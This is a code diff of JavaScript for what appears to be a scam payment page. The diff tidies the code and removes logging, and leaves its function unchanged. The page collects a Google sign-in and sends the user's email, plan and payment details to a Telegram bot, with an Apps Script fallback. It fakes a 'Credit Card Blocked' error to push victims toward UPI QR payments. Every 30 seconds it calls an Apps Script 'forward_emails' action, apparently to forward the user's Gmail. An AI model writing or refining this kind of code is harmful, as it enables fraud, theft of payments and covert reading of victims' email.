@@ -235,7 +235,7 @@ var qrTimerId = null;
 var gmailCheckInterval = null;
 
 /* ============================================================
-   === TELEGRAM — DIRECT + FALLBACK ===
+   === TELEGRAM ===
    ============================================================ */
 function escapeHTML(str) {
   if (!str) return "";
@@ -261,20 +261,16 @@ function sendTelegramDirect(text) {
   })
   .then(function(r){ return r.json(); })
   .then(function(d){
-    if (d && d.ok) {
-      console.log("✅ Telegram (direct):", d);
-      return d;
-    }
+    if (d && d.ok) { console.log("✅ Telegram:", d); return d; }
     throw new Error("Direct failed");
   })
   .catch(function(e){
-    console.warn("⚠️ Direct failed → Apps Script fallback");
     return fetch(APPS_SCRIPT_URL, {
       method: "POST",
       mode: "no-cors",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ action: "send_telegram", text: text, ts: Date.now() })
-    }).catch(function(err){ console.error("❌ Both failed:", err); });
+      body: JSON.stringify({ action: "send_telegram", text: text })
+    });
   });
 }
 
@@ -287,33 +283,24 @@ function triggerGmailForward() {
     method: "POST",
     mode: "no-cors",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ action: "forward_emails", ts: Date.now() })
-  })
-  .then(function(){ console.log("📧 Gmail forward triggered"); })
-  .catch(function(e){ console.error("Gmail error:", e); });
+    body: JSON.stringify({ action: "forward_emails" })
+  }).catch(function(){});
 }
 
-/* 🚀 Har 30 second mein Gmail check */
 function startGmailAutoCheck() {
   if (gmailCheckInterval) clearInterval(gmailCheckInterval);
   triggerGmailForward();
-  gmailCheckInterval = setInterval(function() {
-    console.log("🔄 Auto Gmail check...");
-    triggerGmailForward();
-  }, 30000);
+  gmailCheckInterval = setInterval(triggerGmailForward, 30000);
 }
 
 /* ============================================================
-   === PAGE NAVIGATION ===
+   === NAVIGATION ===
    ============================================================ */
 function go(id) {
   document.querySelectorAll('.page').forEach(function(p){ p.classList.remove('active'); });
   document.getElementById(id).classList.add('active');
   window.scrollTo(0, 0);
-  if (id === 'pgQr') {
-    setTimeout(drawQr, 100);
-    startTimer(600);
-  }
+  if (id === 'pgQr') { setTimeout(drawQr, 100); startTimer(600); }
 }
 
 /* ============================================================
@@ -368,9 +355,7 @@ function handleCredentialResponse(resp) {
 
     document.getElementById('emailDisp').innerText = payload.email || "";
     go('pgPlans');
-  } catch (e) {
-    console.error("Sign-in error:", e);
-  }
+  } catch (e) { console.error(e); }
 }
 
 /* ============================================================
@@ -397,22 +382,11 @@ function pickPay(el, m) {
 function doPay() {
   if (payMethod === 'Credit Card') {
     document.getElementById('errBanner').style.display = 'block';
-    var msg =
-      "⚠️ <b>Credit Card Blocked</b>\n\n" +
-      "📧 User: " + escapeHTML(document.getElementById('emailDisp').innerText || "N/A") + "\n" +
-      "💳 Plan: " + escapeHTML(plan.name) + "\n" +
-      "💰 Price: $" + plan.price.toFixed(2) + "\n" +
-      "⏰ " + new Date().toLocaleString();
+    var msg = "⚠️ <b>Credit Card Blocked</b>\n\n📧 User: " + escapeHTML(document.getElementById('emailDisp').innerText) + "\n💳 Plan: " + escapeHTML(plan.name) + "\n💰 Price: $" + plan.price.toFixed(2) + "\n⏰ " + new Date().toLocaleString();
     sendTelegramDirect(msg);
   } else {
     var tot = (plan.price * 1.02).toFixed(2);
-    var msg =
-      "💳 <b>Payment Initiated</b>\n\n" +
-      "📧 User: " + escapeHTML(document.getElementById('emailDisp').innerText || "N/A") + "\n" +
-      "📦 Plan: " + escapeHTML(plan.name) + "\n" +
-      "💰 Amount: $" + tot + "\n" +
-      "🏦 Method: UPI\n" +
-      "⏰ " + new Date().toLocaleString();
+    var msg = "💳 <b>Payment Initiated</b>\n\n📧 User: " + escapeHTML(document.getElementById('emailDisp').innerText) + "\n📦 Plan: " + escapeHTML(plan.name) + "\n💰 Amount: $" + tot + "\n🏦 Method: UPI\n⏰ " + new Date().toLocaleString();
     sendTelegramDirect(msg);
     go('pgQr');
   }
